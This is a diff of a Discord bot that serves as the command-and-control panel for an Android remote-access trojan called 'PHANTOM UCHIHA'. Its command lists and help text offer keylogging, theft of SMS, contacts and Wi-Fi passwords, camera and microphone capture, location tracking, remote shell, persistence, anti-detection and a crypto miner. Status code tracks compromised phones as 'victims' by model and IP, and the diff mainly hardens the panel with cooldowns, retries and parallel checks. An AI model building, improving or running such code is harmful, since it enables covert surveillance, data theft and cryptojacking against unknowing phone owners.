@@ -1,163 +1,52 @@
 import 'dotenv/config'
-import fs from 'fs'
 import {
-  Client, GatewayIntentBits, Events,
-  EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder,
-  ChannelType, StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
-  SlashCommandBuilder, AttachmentBuilder,
+  Client, GatewayIntentBits, Events, Options,
+  ChannelType, SlashCommandBuilder, AttachmentBuilder, EmbedBuilder,
+  ButtonBuilder, ButtonStyle, ActionRowBuilder,
+  StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
 } from 'discord.js'
-import { ICONS, EMBED_GIFS } from './icons.js'
 import { statusCard } from './statusCard.js'
+import { C, E, A, smallCaps, mono, createBox, bold, ts, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize } from './utils/index.js'
+const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] })
-
-// ── GIFs ────────────────────────────────────────────────────────────────────
-
-const GIFS = fs.readFileSync(new URL('gif.txt', import.meta.url), 'utf8').split('\n').filter(Boolean).map(l => l.trim())
-const ALL_GIFS = [...GIFS, ...EMBED_GIFS]
-
-function randGif() { return ALL_GIFS.length ? ALL_GIFS[Math.floor(Math.random() * ALL_GIFS.length)] : null }
-
-const GIF_CATEGORIES = {
-  online: [
-    'https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif',
-    'https://media.giphy.com/media/3o7abKhP8W5YnfLhBu/giphy.gif',
-    'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif',
-    'https://media.giphy.com/media/LmNwrBhejkK9EFn504/giphy.gif',
-    'https://media.giphy.com/media/l0HlvtIPzPdt2usKs/giphy.gif',
-  ],
-  offline: [
-    'https://media.giphy.com/media/g9582DNu1px0U/giphy.gif',
-    'https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif',
-    'https://media.giphy.com/media/l3q2XhfQ8oCkm1Ts4/giphy.gif',
-    'https://media.giphy.com/media/3o6ozvv5zsJskyzxin/giphy.gif',
-    'https://media.giphy.com/media/l4q8cJzGdR9J8w3hS/giphy.gif',
-  ],
-  success: [
-    'https://media.giphy.com/media/3o7TKh6RqAC6mFLnFa/giphy.gif',
-    'https://media.giphy.com/media/l0MYGb8LuZ3n7d9OQ/giphy.gif',
-    'https://media.giphy.com/media/3o6gDPXMNxFhvHdcfK/giphy.gif',
-  ],
-  error: [
-    'https://media.giphy.com/media/3o7bu3XilJ5BOiSGic/giphy.gif',
-    'https://media.giphy.com/media/xT0xeJpnrWC4XWblEk/giphy.gif',
-    'https://media.giphy.com/media/3o6ozoLh4VXPmCT0G4/giphy.gif',
-  ],
-  menu: GIFS.slice(0, 5),
-  help: GIFS.slice(5, 10),
-  devices: GIFS.slice(10, 15),
-}
-
-function gifForCategory(cat) {
-  const pool = GIF_CATEGORIES[cat] || ALL_GIFS
-  if (!pool || !pool.length) return randGif()
-  return pool[Math.floor(Math.random() * pool.length)]
-}
-
-// ── Theme ────────────────────────────────────────────────────────────────────
-
-const C = {
-  neon: 0xFF003C, electric: 0x00F0FF, purple: 0x9B30FF,
-  blood: 0x8A0303, venom: 0x39FF14, gold: 0xFFD700,
-  dark: 0x0A0A0A, void: 0x1A0A0A, ash: 0x2D2D2D,
-  sharingan: 0xCC0000, mangekyo: 0xFF0000, eternal: 0x8B0000,
-  amaterasu: 0xFF4500, itachi: 0xDC143C, sasuke: 0xFF6347,
-  madara: 0x800000, obito: 0xA52A2A, fire: 0xFF7F50,
-  shadow: 0x2F4F4F, curse: 0x8B008B, sealing: 0x4B0082,
-}
-
-const E = {
-  skull: '💀', knife: '🔪', heart: '🫀', bone: '🦴',
-  coffin: '⚰️', ghost: '👻', spider: '🕷️', web: '🕸️',
-  bomb: '💣', warning: '⚠️', syringe: '💉',
-  microbe: '🦠', brain: '🧠', eye: '👁️', target: '🎯',
-  zap: '⚡', chain: '⛓️', crown: '👑', diamond: '💎',
-  clock: '🕐', pick: '⛏️',
-  sharingan: '👁️‍🗨️', flame: '🔥', kunai: '🗡️', shuriken: '⭐',
-  scroll: '📜', mask: '🎭', cat: '🐱', fox: '🦊',
-  demon: '👹', angel: '😇', sword: '⚔️', shield: '🛡️',
-  book: '📖', star: '🌟', moon: '🌙', sun: '☀️',
-  check: '✅', cross: '❌', warning2: '⚠️', info: 'ℹ️',
-  arrow: '➡️', up: '⬆️', down: '⬇️', left: '⬅️',
-  online: '🟢', offline: '🔴', loading: '⏳', sparkles: '✨',
-  rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏱️',
-}
-
-// ── ANSI (must be before functions that use it) ────────────────────────────
-
-const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
-
-// ── Fonts ──────────────────────────────────────────────────────────────────
-
-function bold(s) {
-  return s.replace(/[a-zA-Z]/g, c => {
-    const n = c.charCodeAt(0)
-    if (n >= 65 && n <= 90) return String.fromCodePoint(0x1D400 + n - 65)
-    if (n >= 97 && n <= 122) return String.fromCodePoint(0x1D41A + n - 97)
-    return c
-  })
-}
-
-function mono(s) {
-  return s.replace(/[a-zA-Z0-9]/g, c => {
-    const n = c.charCodeAt(0)
-    if (n >= 65 && n <= 90) return String.fromCodePoint(0x1D670 + n - 65)
-    if (n >= 97 && n <= 122) return String.fromCodePoint(0x1D68A + n - 97)
-    if (n >= 48 && n <= 57) return String.fromCodePoint(0x1D7F6 + n - 48)
-    return c
-  })
-}
-
-function smallCaps(s) {
-  const map = { a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'ǫ',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ' }
-  return s.toLowerCase().split('').map(c => map[c] || c).join('')
-}
-
-// ── ASCII Box ─────────────────────────────────────────────────────────────
-
-const BOX = {
-  neon: { tl: '╭', tr: '╮', bl: '╰', br: '╯', h: '─', v: '│' },
-  heavy: { tl: '┏', tr: '┓', bl: '┗', br: '┛', h: '━', v: '┃' },
-  double: { tl: '╔', tr: '╗', bl: '╚', br: '╝', h: '═', v: '║' },
-  skull: { tl: '💀', tr: '💀', bl: '💀', br: '💀', h: '═', v: '║' },
-}
-
-function createBox(content, style = 'neon', width = 42) {
-  const s = BOX[style]
-  const lines = content.split('\n')
-  const mL = Math.max(...lines.map(l => l.replace(/\u001b\[.*?m/g, '').length), width)
-  let r = s.tl + s.h.repeat(mL + 2) + s.tr + '\n'
-  for (const l of lines) { const cl = l.replace(/\u001b\[.*?m/g, ''); r += s.v + ' ' + l + ' '.repeat(mL - cl.length) + ' ' + s.v + '\n' }
-  r += s.bl + s.h.repeat(mL + 2) + s.br
-  return r
-}
-
-function barAnim(current, total, length = 10) {
-  const fill = Math.round((current / total) * length)
-  const empty = length - fill
-  return '█'.repeat(fill) + '░'.repeat(empty)
-}
-
-// ── Clock ──────────────────────────────────────────────────────────────────
-
-function clockText() {
-  const d = new Date()
-  const days = ['SUN','MON','TUE','WED','THU','FRI','SAT']
-  const months = ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC']
-  const h = String(d.getHours()).padStart(2,'0')
-  const m = String(d.getMinutes()).padStart(2,'0')
-  const s = String(d.getSeconds()).padStart(2,'0')
-  return `${days[d.getDay()]} ${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}  ${h}:${m}:${s}`
-}
+const client = new Client({
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
+  presence: { status: 'dnd' },
+  makeCache: Options.cacheWithLimits({
+    MessageManager: 50,
+    GuildMemberManager: 10,
+    UserManager: 50,
+    PresenceManager: 0,
+    GuildEmojiManager: 0,
+    GuildBanManager: 0,
+    GuildInviteManager: 0,
+    GuildStickerManager: 0,
+    ReactionManager: 0,
+    ReactionUserManager: 0,
+    ThreadManager: 0,
+    ThreadMemberManager: 0,
+    VoiceStateManager: 0,
+  }),
+  sweepers: {
+    messages: {
+      interval: 3600,
+      filter: () => (msg) => Date.now() - msg.createdTimestamp > 1800000,
+    },
+    users: {
+      interval: 3600,
+      filter: () => (user) => user.id !== client.user?.id,
+    },
+  },
+})
 
 // ── Buttons ────────────────────────────────────────────────────────────────
 
-const BTN = { primary: ButtonStyle.Primary, secondary: ButtonStyle.Secondary, success: ButtonStyle.Success, danger: ButtonStyle.Danger }
+const BTN_STYLE = { primary: ButtonStyle.Primary, secondary: ButtonStyle.Secondary, success: ButtonStyle.Success, danger: ButtonStyle.Danger }
 
 function btn(id, label, emoji, style = 'danger') {
-  return new ButtonBuilder().setCustomId(id).setEmoji(emoji).setLabel(label).setStyle(BTN[style] || BTN.danger)
+  return new ButtonBuilder().setCustomId(id).setEmoji(emoji).setLabel(label).setStyle(BTN_STYLE[style] || BTN_STYLE.danger)
 }
 
 function actionRow(...btns) {
@@ -183,7 +72,14 @@ const MENU_BTNS = [
   ...actionRow(B.target, B.broadcast, B.info),
   ...actionRow(B.menu, B.help),
 ].flat()
+
 const HELP_BTNS = actionRow(B.menu).flat()
+
+const RESULT_BTNS = [
+  ...actionRow(B.screenshot, B.stream, B.shell),
+  ...actionRow(B.victims, B.target, B.menu),
+].flat()
+
 const ALERT_BTNS_ONLINE = (chId) => [
   new ActionRowBuilder().addComponents(
     btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
@@ -194,11 +90,6 @@ const ALERT_BTNS_ONLINE = (chId) => [
   ),
 ]
 
-const RESULT_BTNS = [
-  ...actionRow(B.screenshot, B.stream, B.shell),
-  ...actionRow(B.victims, B.target, B.menu),
-].flat()
-
 const ALERT_BTNS_OFFLINE = (chId) => [
   new ActionRowBuilder().addComponents(
     btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
@@ -206,116 +97,11 @@ const ALERT_BTNS_OFFLINE = (chId) => [
   ),
 ]
 
-// ── State ───────────────────────────────────────────────────────────────────
-
-const targets = new Map()
-const deviceStatus = new Map()
-const devicePages = new Map()
-const rateLimits = new Map()
-const commandLog = new Map()
-const HEARTBEAT_TIMEOUT = 11 * 60 * 1000
-const STATUS_CHECK_INTERVAL = 5 * 60 * 1000
-const PAGINATION_TIMEOUT = 120000
-const SELECT_TIMEOUT = 30000
-const MAP_CLEANUP_INTERVAL = 600000
-const RATE_LIMIT_WINDOW = 5000
-const RATE_LIMIT_MAX = 10
-const COMMAND_LOG_MAX = 50
-let statusCheckerId = null
-let cleanupIntervalId = null
-let startupMsgSent = false
-const alertCooldown = new Map()
-
-// ── Allowed command list for broadcast ─────────────────────────────────────
-
-const DEV_CMDS = new Set([
-  'ping', 'info', 'screenshot', 'camera', 'location', 'contacts', 'sms', 'call_log',
-  'mic', 'clipboard', 'persist', 'shell', 'keylog', 'status', 'debug', 'restart',
-  'wifi', 'battery', 'processes', 'installed', 'torch', 'vibrate', 'uptime', 'notifications',
-  'admin', 'overlay', 'click', 'input', 'open', 'screen', 'gesture', 'pin', 'ip', 'stream',
-  'update', 'config', 'grabber',
-  'wifipass', 'netstat', 'sysinfo', 'antidetect', 'sysprop', 'services', 'apps', 'storage',
-  'miner', 'upload',
-])
-
-const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream']
-
-const VALID_CMDS = new Set([
-  'ping', 'info', 'screenshot', 'camera', 'location', 'contacts', 'sms', 'call_log',
-  'mic', 'clipboard', 'persist', 'shell', 'keylog', 'status', 'debug', 'restart',
-  'wifi', 'battery', 'processes', 'installed', 'torch', 'vibrate', 'uptime', 'notifications',
-  'admin', 'overlay', 'click', 'input', 'open', 'screen', 'gesture', 'pin', 'ip', 'stream',
-  'update', 'config', 'grabber',
-  'wifipass', 'netstat', 'sysinfo', 'antidetect', 'sysprop', 'services', 'apps', 'storage',
-  'miner', 'upload',
-])
-
-const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner' }
-const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell' }
-
-function formatSize(bytes) {
-  if (bytes < 1024) return `${bytes} B`
-  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(0)} KB`
-  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`
-}
-
-function isRateLimited(uid) {
-  const now = Date.now()
-  const data = rateLimits.get(uid)
-  if (!data) { rateLimits.set(uid, { count: 1, ts: now }); return false }
-  if (now - data.ts > RATE_LIMIT_WINDOW) { rateLimits.set(uid, { count: 1, ts: now }); return false }
-  data.count++
-  return data.count > RATE_LIMIT_MAX
-}
-
-function logCommand(userId, userName, cmd, payload, channelName) {
-  const entry = { user: userName, cmd, payload, channel: channelName, ts: Date.now() }
-  if (!commandLog.has(userId)) commandLog.set(userId, [])
-  const log = commandLog.get(userId)
-  log.push(entry)
-  if (log.length > COMMAND_LOG_MAX) log.shift()
-}
-
-function formatCommandLog(userId) {
-  const log = commandLog.get(userId) || []
-  if (!log.length) return 'No commands executed'
-  return log.slice(-15).reverse().map(e => {
-    const ago = Math.round((Date.now() - e.ts) / 60000)
-    const timeStr = ago < 1 ? 'just now' : `${ago}m ago`
-    return `\`${e.cmd}${e.payload ? ' ' + e.payload : ''}\` → ${e.channel} (${timeStr})`
-  }).join('\n')
-}
-
-function ts() { return `<t:${Math.floor(Date.now() / 1000)}:R>` }
-const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
-
-function getPhantomChannels(guild) {
-  return guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
-}
-
-function findPhantomChannel(guild, name) {
-  const prefix = name.startsWith('phantom-') ? name : 'phantom-' + name
-  return guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.name === prefix)
-}
-
-async function sendCmd(channel, cmd, payload = '') {
-  try { await channel.send(payload ? `!${cmd} ${payload}` : `!${cmd}`); return { ok: true, name: channel.name } }
-  catch (e) { return { ok: false, err: e.message } }
-}
-
-async function sendCmdLogged(channel, cmd, payload, userId, userName) {
-  const result = await sendCmd(channel, cmd, payload)
-  if (result.ok) logCommand(userId, userName, cmd, payload, channel.name)
-  return result
-}
-
-async function sendToTarget(uid, guild, cmd, payload) {
-  const data = targets.get(uid)
-  if (!data) return { ok: false, err: 'no_target' }
-  const chId = typeof data === 'object' ? data.chId : data
-  const ch = guild.channels.cache.get(chId)
-  if (!ch) { targets.delete(uid); return { ok: false, err: 'gone' } }
-  return sendCmd(ch, cmd, payload)
+function paginationRow(disabled = false) {
+  return [new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('prev').setLabel('◀ PREV').setStyle(ButtonStyle.Primary).setDisabled(disabled),
+    new ButtonBuilder().setCustomId('next').setLabel('NEXT ▶').setStyle(ButtonStyle.Primary).setDisabled(disabled),
+  )]
 }
 
 function devSelectPages(channels) {
@@ -342,11 +128,100 @@ function devSelectPages(channels) {
   return pages
 }
 
-function paginationRow(disabled = false) {
-  return [new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId('prev').setLabel('◀ PREV').setStyle(ButtonStyle.Primary).setDisabled(disabled),
-    new ButtonBuilder().setCustomId('next').setLabel('NEXT ▶').setStyle(ButtonStyle.Primary).setDisabled(disabled),
-  )]
+// ── State ───────────────────────────────────────────────────────────────────
+
+const targets = new Map()
+const deviceStatus = new Map()
+const devicePages = new Map()
+const rateLimits = new Map()
+const commandLog = new Map()
+const commandCooldowns = new Map()
+const HEARTBEAT_TIMEOUT = 11 * 60 * 1000
+const STATUS_CHECK_INTERVAL = 5 * 60 * 1000
+const PAGINATION_TIMEOUT = 120000
+const SELECT_TIMEOUT = 30000
+const MAP_CLEANUP_INTERVAL = 600000
+const RATE_LIMIT_WINDOW = 5000
+const RATE_LIMIT_MAX = 10
+const COMMAND_LOG_MAX = 50
+const COMMAND_COOLDOWN = 2000
+let statusCheckerId = null
+let cleanupIntervalId = null
+let startupMsgSent = false
+const alertCooldown = new Map()
+
+// ── Allowed command list for broadcast ─────────────────────────────────────
+
+function isRateLimited(uid) {
+  const now = Date.now()
+  const data = rateLimits.get(uid)
+  if (!data) { rateLimits.set(uid, { count: 1, ts: now }); return false }
+  if (now - data.ts > RATE_LIMIT_WINDOW) { rateLimits.set(uid, { count: 1, ts: now }); return false }
+  data.count++
+  return data.count > RATE_LIMIT_MAX
+}
+
+function isOnCooldown(uid) {
+  const now = Date.now()
+  const cd = commandCooldowns.get(uid)
+  if (!cd || now - cd > COMMAND_COOLDOWN) { commandCooldowns.set(uid, now); return false }
+  return true
+}
+
+function logCommand(userId, userName, cmd, payload, channelName) {
+  const entry = { user: userName, cmd, payload, channel: channelName, ts: Date.now() }
+  if (!commandLog.has(userId)) commandLog.set(userId, [])
+  const log = commandLog.get(userId)
+  log.push(entry)
+  if (log.length > COMMAND_LOG_MAX) log.shift()
+}
+
+function formatCommandLog(userId) {
+  const log = commandLog.get(userId) || []
+  if (!log.length) return 'No commands executed'
+  return log.slice(-15).reverse().map(e => {
+    const ago = Math.round((Date.now() - e.ts) / 60000)
+    const timeStr = ago < 1 ? 'just now' : `${ago}m ago`
+    return `\`${e.cmd}${e.payload ? ' ' + e.payload : ''}\` → ${e.channel} (${timeStr})`
+  }).join('\n')
+}
+
+function getPhantomChannels(guild) {
+  return guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
+}
+
+function findPhantomChannel(guild, name) {
+  const prefix = name.startsWith('phantom-') ? name : 'phantom-' + name
+  return guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.name === prefix)
+}
+
+async function sendCmd(channel, cmd, payload = '', retries = 2) {
+  try {
+    await channel.send(payload ? `!${cmd} ${payload}` : `!${cmd}`)
+    return { ok: true, name: channel.name }
+  } catch (e) {
+    if (e.code === 429 && retries > 0) {
+      const wait = (e.retryAfter || 1000) * 1.5
+      await new Promise(r => setTimeout(r, wait))
+      return sendCmd(channel, cmd, payload, retries - 1)
+    }
+    return { ok: false, err: e.message }
+  }
+}
+
+async function sendCmdLogged(channel, cmd, payload, userId, userName) {
+  const result = await sendCmd(channel, cmd, payload)
+  if (result.ok) logCommand(userId, userName, cmd, payload, channel.name)
+  return result
+}
+
+async function sendToTarget(uid, guild, cmd, payload) {
+  const data = targets.get(uid)
+  if (!data) return { ok: false, err: 'no_target' }
+  const chId = typeof data === 'object' ? data.chId : data
+  const ch = guild.channels.cache.get(chId)
+  if (!ch) { targets.delete(uid); return { ok: false, err: 'gone' } }
+  return sendCmd(ch, cmd, payload)
 }
 
 function buildDevicePages(guild) {
@@ -375,7 +250,7 @@ function buildDevicePages(guild) {
     const t = Math.ceil(sorted.length / 5)
     const { embeds } = bloodEmbed(bold(`${E.sharingan} VICTIMS: ${sorted.length}`), onlineCount > 0 ? 'online' : 'offline',
       `\`\`\`ansi\n${body}\n\`\`\``,
-      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: gifForCategory('devices') })
+      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: randGif() })
     const comps = sorted.length > 5 ? [...paginationRow(), ...MENU_BTNS] : MENU_BTNS
     pages.push({ embeds, components: comps })
   }
@@ -398,7 +273,7 @@ function bloodEmbed(title, status, desc, opts = {}) {
     .setDescription(desc)
     .setThumbnail(thumb)
     .setImage(image)
-    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer })
+    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
   if (opts.fields) e.addFields(opts.fields)
   return { embeds: [e] }
 }
@@ -424,7 +299,7 @@ function menuEmbed() {
     `• \`/menu\` \`/help\` \`/devices\` \`/target\`\n` +
     `• \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\`\n\n` +
     `**${total > 0 ? `${E.knife} Ready — select a victim to begin` : `${E.coffin} Waiting for devices...`}**`,
-    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: gifForCategory('menu') })
+    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: randGif() })
 }
 
 function helpEmbed() {
@@ -461,8 +336,8 @@ function helpEmbed() {
     .setColor(C.sharingan)
     .setTitle(`${E.sharingan} PHANTOM UCHIHA — COMMAND REFERENCE`)
     .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
-    .setThumbnail(gifForCategory('help'))
-    .setImage(gifForCategory('help'))
+    .setThumbnail(randGif())
+    .setImage(randGif())
     .addFields(
       { name: `${E.zap} RECON`, value: '`!ping` `!info` `!status` `!ip` `!uptime` `!debug` `!restart`', inline: true },
       { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
@@ -473,7 +348,7 @@ function helpEmbed() {
       { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
       { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
     )
-    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}`, iconURL: ICONS.footer })
+    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}` })
   return { embeds: [e] }
 }
 
@@ -511,6 +386,7 @@ client.on(Events.InteractionCreate, async (i) => {
     const { commandName, options, user, guild } = i
     const uid = user.id
     if (!guild) return
+    if (isOnCooldown(uid)) return
 
     try {
       switch (commandName) {
@@ -716,6 +592,7 @@ client.on(Events.InteractionCreate, async (i) => {
     const uid = i.user.id, guild = i.guild
     if (!guild) return
     if (isRateLimited(uid)) return i.reply({ content: `${E.skull} Rate limited. Wait a moment.`, ephemeral: true }).catch(() => {})
+    if (isOnCooldown(uid)) return i.reply({ content: `${E.skull} Cooldown. Wait a moment.`, ephemeral: true }).catch(() => {})
 
     // ── Defer immediately to prevent "interaction failed" ──
     if (!i.deferred && !i.replied) await i.deferUpdate().catch(() => {})
@@ -869,6 +746,7 @@ client.on(Events.MessageCreate, async (msg) => {
   const uid = msg.author.id, guild = msg.guild
   if (!guild) return
   if (isRateLimited(uid)) return
+  if (isOnCooldown(uid)) return
 
   try {
     if (BOT_CMDS.includes(cmdL)) {
@@ -1103,6 +981,7 @@ client.on(Events.MessageCreate, async (msg) => {
 
 let checkerRunning = false
 let botStartTime = Date.now()
+const deviceCheckLocks = new Set()
 
 async function refreshDeviceStatus(guild, sendAlerts = false) {
   if (checkerRunning) return
@@ -1111,87 +990,94 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
     const allChannels = await guild.channels.fetch()
     const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
     const alertCh = sendAlerts ? await getAlertChannel() : null
-    for (const [, ch] of channels) {
-      let online = false, lastSeen = null
+    await Promise.allSettled([...channels].map(async ([, ch]) => {
+      if (deviceCheckLocks.has(ch.id)) return
+      deviceCheckLocks.add(ch.id)
       try {
-        const msgs = await ch.messages.fetch({ limit: 25 })
-        for (const [, m] of msgs) {
-          if (!m.content) continue
-          const isHeartbeat = m.content.includes('🟢') || m.content.includes(':heartbeat:') || /<:heartbeat:\d+>/.test(m.content) || m.content.includes(':green_circle:') || /<:green_circle:\d+>/.test(m.content)
-          if (isHeartbeat && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
-            online = true; lastSeen = m.createdTimestamp; break
+        let online = false, lastSeen = null
+        try {
+          const msgs = await ch.messages.fetch({ limit: 25 })
+          for (const [, m] of msgs) {
+            if (!m.content) continue
+            const isHeartbeat = m.content.includes('🟢') || m.content.includes(':heartbeat:') || /<:heartbeat:\d+>/.test(m.content) || m.content.includes(':green_circle:') || /<:green_circle:\d+>/.test(m.content)
+            if (isHeartbeat && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
+              online = true; lastSeen = m.createdTimestamp; break
+            }
           }
+          if (!online && msgs.size > 0) {
+            lastSeen = msgs.first().createdTimestamp
+            if (Date.now() - lastSeen < HEARTBEAT_TIMEOUT) online = true
+          }
+        } catch (_) {}
+        const prev = deviceStatus.get(ch.id)
+        const wasOnline = prev?.online ?? false
+        deviceStatus.set(ch.id, { online, lastSeen, name: ch.name })
+        if (!alertCh || wasOnline === online) return
+        const cooldownKey = `${ch.id}:${online}`
+        const lastAlert = alertCooldown.get(cooldownKey) || 0
+        if (Date.now() - lastAlert < 300000) return
+        if (Date.now() - botStartTime < 60000) return
+        alertCooldown.set(cooldownKey, Date.now())
+        let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
+        try {
+          const msgs = await ch.messages.fetch({ limit: 25 })
+          for (const [, m] of msgs) {
+            if (!m.content) continue
+            const om = m.content.match(/\*\*Device Online\*\* — (.+?) \((.+?)\) \| IP: (.+)/)
+            if (om) { mModel = om[1]; mAndroid = om[2]; mIp = om[3]; break }
+            const hm = m.content.match(/\*\*Alive\*\* — (.+?) \| IP: (.+)/)
+            if (hm) { mModel = hm[1]; mIp = hm[2]; break }
+          }
+        } catch (_) {}
+        const e = new EmbedBuilder()
+        const deviceName = ch.name.replace('phantom-', '')
+        const cardBuffer = await statusCard({
+          deviceName, status: online ? 'online' : 'offline',
+          model: mModel !== '?' ? mModel : 'Unknown',
+          android: mAndroid !== '?' ? mAndroid : 'Unknown',
+          ip: mIp !== '?' ? mIp : 'Unknown',
+          lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'),
+          theme: 'blood'
+        })
+        const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
+        if (!online) {
+          const ago = lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'
+          const fields = [
+            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
+            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
+            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
+            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
+            { name: `${E.clock} Last Seen`, value: ago, inline: true },
+            { name: `${E.heart} Status`, value: `${E.coffin} **OFFLINE**`, inline: true },
+          ]
+          e.setColor(C.void)
+            .setTitle(`${E.coffin} ${ch.name} EXSANGUINATED ${E.coffin}`)
+            .setThumbnail(randGif())
+            .setImage(`attachment://status-${deviceName}.png`)
+            .addFields(fields)
+            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+          await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
+        } else {
+          const fields = [
+            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
+            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
+            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
+            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
+            { name: `${E.heart} Status`, value: `${E.chain} **ONLINE**`, inline: true },
+            { name: `${E.zap} Connected`, value: ts(), inline: true },
+          ]
+          e.setColor(C.neon)
+            .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
+            .setThumbnail(randGif())
+            .setImage(`attachment://status-${deviceName}.png`)
+            .addFields(fields)
+            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+          await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
         }
-        if (!online && msgs.size > 0) {
-          lastSeen = msgs.first().createdTimestamp
-          if (Date.now() - lastSeen < HEARTBEAT_TIMEOUT) online = true
-        }
-      } catch (_) {}
-      const prev = deviceStatus.get(ch.id)
-      const wasOnline = prev?.online ?? false
-      deviceStatus.set(ch.id, { online, lastSeen, name: ch.name })
-      if (!alertCh || wasOnline === online) continue
-      const cooldownKey = `${ch.id}:${online}`
-      const lastAlert = alertCooldown.get(cooldownKey) || 0
-      if (Date.now() - lastAlert < 300000) continue
-      if (Date.now() - botStartTime < 60000) continue
-      alertCooldown.set(cooldownKey, Date.now())
-      let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
-      try {
-        for (const [, m] of msgs) {
-          if (!m.content) continue
-          const om = m.content.match(/\*\*Device Online\*\* — (.+?) \((.+?)\) \| IP: (.+)/)
-          if (om) { mModel = om[1]; mAndroid = om[2]; mIp = om[3]; break }
-          const hm = m.content.match(/\*\*Alive\*\* — (.+?) \| IP: (.+)/)
-          if (hm) { mModel = hm[1]; mIp = hm[2]; break }
-        }
-      } catch (_) {}
